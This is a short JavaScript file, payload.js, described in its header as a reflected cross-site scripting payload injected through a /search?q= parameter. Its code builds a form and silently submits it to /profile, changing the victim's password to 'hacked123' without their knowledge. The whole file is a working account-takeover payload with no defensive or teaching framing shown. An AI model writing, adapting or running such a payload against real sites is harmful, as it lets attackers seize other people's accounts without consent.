/*
Script: payload.js
Reflected XSS payload, runs in victim's browser via /search?q=...
Changes victim's password through /profile, without them noticing
*/

var form = document.createElement("form");
form.method = "POST";
form.action = "/profile";

var passwordInput = document.createElement("input");
passwordInput.name = "password";
passwordInput.value = "hacked123";
form.appendChild(passwordInput);

document.body.appendChild(form);
form.submit();
